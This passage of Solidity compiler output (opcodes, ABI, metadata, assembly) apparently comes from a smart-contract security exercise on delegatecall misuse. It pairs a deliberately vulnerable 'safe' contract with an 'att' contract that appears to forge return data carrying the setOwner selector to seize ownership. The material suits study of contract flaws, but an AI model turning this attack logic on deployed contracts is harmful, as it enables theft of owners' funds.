											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "AND"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "AND"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP2"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "MSTORE"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "ADD"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "SWAP2"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "POP"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "POP"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "MLOAD"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP1"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP4"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "SUB"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP2"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP8"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "DUP1"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "POP"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "GAS"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "CALL"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "POP"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "POP"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "POP"
										},
										{
											"begin": 614,
											"end": 636,
											"name": "POP"
										},
										{
											"begin": 577,
											"end": 644,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "JUMPDEST"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SWAP1"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SLOAD"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SWAP1"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "EXP"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "SWAP1"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "DIV"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "AND"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "DUP2"
										},
										{
											"begin": 137,
											"end": 151,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "JUMPDEST"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "MLOAD"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "ADD"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2"
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "SWAP1"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "MSTORE"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "PUSH",
											"value": "40CAAE0600000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "NOT"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "AND"
										},
										{
											"begin": 38,
											"end": 42,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 29,
											"end": 36,
											"name": "DUP3"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD"
										},
										{
											"begin": 67,
											"end": 77,
											"name": "DUP1"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD"
										},
										{
											"begin": 96,
											"end": 154,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 199,
											"end": 207,
											"name": "DUP4"
										},
										{
											"begin": 192,
											"end": 196,
											"name": "DUP2"
										},
										{
											"begin": 186,
											"end": 190,
											"name": "DUP4"
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND"
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR"
										},
										{
											"begin": 167,
											"end": 177,
											"name": "DUP4"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP"
										},
										{
											"begin": 186,
											"end": 223,
											"name": "POP"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "DUP2"
										},
										{
											"begin": 158,
											"end": 223,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "JUMPDEST"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "DUP1"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SWAP1"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SLOAD"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SWAP1"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "EXP"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "SWAP1"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "DIV"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "AND"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "DUP2"
										},
										{
											"begin": 78,
											"end": 99,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "JUMPDEST"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SWAP1"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SLOAD"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SWAP1"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "EXP"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "SWAP1"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "DIV"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "MUL"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "DUP2"
										},
										{
											"begin": 230,
											"end": 268,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 339,
											"end": 571,
											"name": "JUMPDEST"
										},
										{
											"begin": 383,
											"end": 393,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 416,
											"end": 427,
											"name": "DUP1"
										},
										{
											"begin": 395,
											"end": 405,
											"name": "PUSH",
											"value": "40CAAE06"
										},
										{
											"begin": 383,
											"end": 405,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 383,
											"end": 405,
											"name": "MUL"
										},
										{
											"begin": 383,
											"end": 405,
											"name": "SWAP2"
										},
										{
											"begin": 383,
											"end": 405,
											"name": "POP"
										},
										{
											"begin": 438,
											"end": 444,
											"name": "PUSH",
											"value": "2022"
										},
										{
											"begin": 430,
											"end": 445,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 430,
											"end": 445,
											"name": "MUL"
										},
										{
											"begin": 416,
											"end": 445,
											"name": "SWAP1"
										},
										{
											"begin": 416,
											"end": 445,
											"name": "POP"
										},
										{
											"begin": 490,
											"end": 493,
											"name": "DUP2"
										},
										{
											"begin": 487,
											"end": 488,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 480,
											"end": 494,
											"name": "MSTORE"
										},
										{
											"begin": 520,
											"end": 523,
											"name": "DUP1"
										},
										{
											"begin": 515,
											"end": 518,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 508,
											"end": 524,
											"name": "MSTORE"
										},
										{
											"begin": 548,
											"end": 552,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 545,
											"end": 546,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 538,
											"end": 553,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"SEL()": "7867fdea",
							"attract()": "50f35753",
							"gift(address)": "cbfc4bce",
							"owner()": "8da5cb5b",
							"password()": "224b610b",
							"sa()": "77bd73db",
							"set()": "b8e010de"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.4.26+commit.4563c3fc\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":true,\"inputs\":[],\"name\":\"password\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"attract\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"sa\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"SEL\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"set\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes4\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"gift\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"shoot/3/delegatecall\\u8c03\\u7528\\u51fa\\u9519/1.sol\":\"att\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"shoot/3/delegatecall\\u8c03\\u7528\\u51fa\\u9519/1.sol\":{\"keccak256\":\"0x150ca5968d5b93337be8f184c4689c278930ed780afe3dcbdce68207129bcdc4\",\"urls\":[\"bzzr://c1f2db8df19e3fab196d519a18d4814384a736c045a3e2ea922f690ddfcb9c1e\"]}},\"version\":1}",
					"userdoc": {
						"methods": {}
					}
				},
				"safe": {
					"abi": [
						{
							"constant": false,
							"inputs": [],
							"name": "setOwner",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "complete",
							"outputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"name": "val",
									"type": "uint256"
								}
							],
							"name": "setPassword",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getReturns",
							"outputs": [
								{
									"name": "sel",
									"type": "bytes4"
								},
								{
									"name": "val",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"name": "_target",
									"type": "address"
								}
							],
							"name": "gift",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "score",
							"outputs": [
								{
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "isCompleted",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"payable": true,
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"shoot/3/delegatecall调用出错/1.sol\":651:2387  contract safe{\r... */\n  mstore(0x40, 0x80)\n    /* \"shoot/3/delegatecall调用出错/1.sol\":936:992  constructor()public{\r... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"shoot/3/delegatecall调用出错/1.sol\":936:992  constructor()public{\r... */\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":974:984  msg.sender */\n  caller\n    /* \"shoot/3/delegatecall调用出错/1.sol\":966:971  owner */\n  0x0\n  dup1\n    /* \"shoot/3/delegatecall调用出错/1.sol\":966:984  owner = msg.sender */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":651:2387  contract safe{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"shoot/3/delegatecall调用出错/1.sol\":651:2387  contract safe{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x40caae06\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x522e1177\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x68e9a07e\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xade58ccb\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xcbfc4bce\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xefedc669\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xfa391c64\n      eq\n      tag_8\n      jumpi\n    tag_1:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_11\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_11:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n      pop\n      tag_12\n      jump(tag_13)\n    tag_12:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1000:1167  function complete()public payable{\r... */\n    tag_3:\n      tag_14\n      jump(tag_15)\n    tag_14:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1594:1745  function setPassword(uint256 val)public{\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_16:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1594:1745  function setPassword(uint256 val)public{\r... */\n      pop\n      tag_17\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_18)\n    tag_17:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1753:2147  function getReturns()public pure returns(bytes4 sel, uint256 val){\r... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_19:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1753:2147  function getReturns()public pure returns(bytes4 sel, uint256 val){\r... */\n      pop\n      tag_20\n      jump(tag_21)\n    tag_20:\n      mload(0x40)\n      dup1\n      dup4\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_22:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n      pop\n      tag_23\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_24)\n    tag_23:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":731:751  uint256 public score */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_25\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_25:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":731:751  uint256 public score */\n      pop\n      tag_26\n      jump(tag_27)\n    tag_26:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n    tag_8:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_28:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n      pop\n      tag_29\n      jump(tag_30)\n    tag_29:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n    tag_13:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":886:890  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":865:891  msg.sender ==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":865:875  msg.sender */\n      caller\n        /* \"shoot/3/delegatecall调用出错/1.sol\":865:891  msg.sender ==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":857:892  require(msg.sender ==address(this)) */\n      iszero\n      iszero\n      tag_32\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_32:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":911:920  tx.origin */\n      origin\n        /* \"shoot/3/delegatecall调用出错/1.sol\":903:908  owner */\n      0x0\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":903:920  owner = tx.origin */\n      0x100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":821:928  function setOwner()public{\r... */\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1000:1167  function complete()public payable{\r... */\n    tag_15:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1074:1075  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1060:1064  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1052:1073  address(this).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1052:1075  address(this).balance>0 */\n      gt\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1044:1076  require(address(this).balance>0) */\n      iszero\n      iszero\n      tag_34\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_34:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1108:1112  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1100:1121  address(this).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1090:1099  msg.value */\n      callvalue\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1090:1121  msg.value>address(this).balance */\n      gt\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1087:1158  if(msg.value>address(this).balance){\r... */\n      iszero\n      tag_35\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1143:1146  100 */\n      0x64\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1137:1142  score */\n      0x2\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1137:1146  score=100 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1087:1158  if(msg.value>address(this).balance){\r... */\n    tag_35:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1000:1167  function complete()public payable{\r... */\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1594:1745  function setPassword(uint256 val)public{\r... */\n    tag_18:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1672:1676  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1652:1677  msg.sender==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1652:1662  msg.sender */\n      caller\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1652:1677  msg.sender==address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1644:1678  require(msg.sender==address(this)) */\n      iszero\n      iszero\n      tag_37\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_37:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1723:1726  val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1721:1722  1 */\n      0x1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1714:1727  sstore(1,val) */\n      sstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1698:1738  { \r... */\n      pop\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1753:2147  function getReturns()public pure returns(bytes4 sel, uint256 val){\r... */\n    tag_21:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1794:1804  bytes4 sel */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1806:1817  uint256 val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1882:1886  0x24 */\n      0x24\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1866:1880  returndatasize */\n      returndatasize\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1863:1887  eq(returndatasize, 0x24) */\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1856:1888  iszero(eq(returndatasize, 0x24)) */\n      iszero\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1853:1855  if */\n      iszero\n      tag_39\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1901:1902  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1898:1899  0 */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1891:1903  revert(0, 0) */\n      revert\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1853:1855  if */\n    tag_39:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1936:1940  0x40 */\n      0x40\n        /* 